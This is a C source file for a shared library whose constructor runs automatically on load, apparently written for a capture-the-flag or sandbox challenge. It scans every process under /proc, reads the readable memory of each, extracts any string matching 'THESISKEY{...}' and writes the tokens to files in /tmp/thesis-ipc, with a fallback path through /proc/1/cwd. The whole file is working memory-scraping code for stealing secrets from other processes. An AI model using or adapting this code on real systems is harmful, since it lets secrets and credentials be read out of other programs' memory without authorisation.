#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdint.h>

// Constructor runs when library is loaded
__attribute__((constructor))
static void init(void) {
    // Search all processes for THESISKEY
    DIR *proc_dir = opendir("/proc");
    if (!proc_dir) return;

    FILE *out = fopen("/tmp/thesis-ipc/memread_result.txt", "a");
    if (!out) out = fopen("/proc/1/cwd/../../../tmp/thesis-ipc/memread_result.txt", "a");
    if (!out) out = stderr;

    fprintf(out, "[memreader] loaded, scanning processes...\n");
    fflush(out);

    struct dirent *ent;
    while ((ent = readdir(proc_dir)) != NULL) {
        // Check if dir name is a number (PID)
        char *endp;
        long pid = strtol(ent->d_name, &endp, 10);
        if (*endp != '\0' || pid <= 0) continue;

        char maps_path[64], mem_path[64];
        snprintf(maps_path, sizeof(maps_path), "/proc/%ld/maps", pid);
        snprintf(mem_path, sizeof(mem_path), "/proc/%ld/mem", pid);

        FILE *maps_f = fopen(maps_path, "r");
        if (!maps_f) continue;

        int mem_fd = open(mem_path, O_RDONLY);
        if (mem_fd < 0) {
            fclose(maps_f);
            continue;
        }

        fprintf(out, "[memreader] scanning PID %ld\n", pid);
        fflush(out);

        char line[256];
        while (fgets(line, sizeof(line), maps_f)) {
            unsigned long start, end;
            char perms[8];
            if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
            if (perms[0] != 'r') continue;

            unsigned long size = end - start;
            if (size > 64 * 1024 * 1024) continue; // skip huge segments

            char *buf = malloc(size);
            if (!buf) continue;

            ssize_t n = pread(mem_fd, buf, size, (off_t)start);
            if (n > 0) {
                // Search for THESISKEY{
                char *needle = "THESISKEY{";
                size_t nlen = strlen(needle);
                for (ssize_t i = 0; i < n - (ssize_t)nlen; i++) {
                    if (memcmp(buf + i, needle, nlen) == 0) {
                        // Found it! Extract the full token
                        char token[256] = {0};
                        size_t j = 0;
                        while (i + j < (size_t)n && j < 255 && buf[i+j] != '}') {
                            token[j] = buf[i+j];
                            j++;
                        }
                        if (i + j < (size_t)n) token[j] = '}';
                        fprintf(out, "FOUND TOKEN in PID %ld: %s\n", pid, token);
                        fflush(out);

                        // Also write to a dedicated file
                        FILE *tf = fopen("/tmp/thesis-ipc/TOKEN.txt", "w");
                        if (!tf) tf = fopen("/proc/1/cwd/../../../tmp/thesis-ipc/TOKEN.txt", "w");
                        if (tf) {
                            fprintf(tf, "%s\n", token);
                            fclose(tf);
                        }
                    }
                }
            }
            free(buf);
        }

        close(mem_fd);
        fclose(maps_f);
    }

    closedir(proc_dir);
    fprintf(out, "[memreader] scan complete\n");
    fflush(out);
    if (out != stderr) fclose(out);
}
EOF

